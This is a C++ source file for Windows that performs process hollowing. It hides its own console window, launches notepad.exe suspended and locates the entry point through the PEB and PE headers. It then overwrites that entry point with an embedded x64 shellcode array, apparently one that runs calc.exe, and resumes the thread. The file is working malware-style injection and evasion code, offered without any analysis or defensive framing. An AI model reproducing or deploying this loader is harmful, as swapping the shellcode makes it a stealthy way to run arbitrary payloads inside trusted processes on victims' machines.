#include <windows.h>
#include <iostream>
#include <algorithm>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

BOOL bProcessOpened = FALSE, bWroteMemory = FALSE;


/* function to hide window and run in the background */
void StealthMode() {
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", nullptr);
    ShowWindow(stealth, 0);
}

int main() { 

    /* hide the program */
    StealthMode();

    const char buffer[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";

    const auto size_buffer = strlen(buffer);

    /* initialize info for the hollowrd process */
    STARTUPINFOA startupinfo;
    ZeroMemory(&startupinfo, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);

    PROCESS_INFORMATION processinfo;
    ZeroMemory(&processinfo, sizeof(processinfo));

    /* creating a notepad process to hollow */
    bProcessOpened = CreateProcessA(
        0,
        (LPSTR)"C:\\windows\\system32\\notepad.exe",
        0,
        0,
        0,
        CREATE_SUSPENDED, // for hollowing
        0,
        0,
        &startupinfo,
        &processinfo
    );

    /* check for the return value of CreateProcessA */
    if (bProcessOpened == FALSE) {
        std::cerr << "Failed in creating a process to hollow, error code: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << processinfo.dwProcessId << std::endl;

    PROCESS_BASIC_INFORMATION pbi{};

    /* getting the PEB of the process to hollow */
    auto bGetPEB = NtQueryInformationProcess(
        processinfo.hProcess,
        ProcessBasicInformation, // PEB structre
        &pbi,
        sizeof(pbi),
        0
    );

    /* check for the return value of NtQueryInformationProcess */
    if (bGetPEB != 0) {
        std::cerr << "Failed in writing the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    DWORD64 pebOffset = (DWORD64)pbi.PebBaseAddress + 0x10;

    LPVOID imageBase = 0;
    ReadProcessMemory(processinfo.hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);

    BYTE headersBuffer[4096] = { 0 };
    ReadProcessMemory(processinfo.hProcess, imageBase, &headersBuffer, sizeof(headersBuffer), NULL);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS64 pNTHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headersBuffer + pDosHeader->e_lfanew);
    LPVOID codeEntry = (LPVOID)(pNTHeaders->OptionalHeader.AddressOfEntryPoint + (DWORD64)imageBase);

    /* writing the shellcode inside the process's memory */
    bWroteMemory = WriteProcessMemory(
        processinfo.hProcess,
        codeEntry,
        buffer,
        size_buffer,
        NULL
    );

    /* check for the return value of WriteProcessMemory */
    if (bWroteMemory == FALSE) {
        std::cerr << "Failed in writing the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* resuming the thread */
    if (ResumeThread(processinfo.hThread) == -1) {
        std::cerr << "Failed in resuming the hollowed process's thread, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* cleaning up */
    CloseHandle(processinfo.hProcess);
    CloseHandle(processinfo.hThread);

    return 0;
}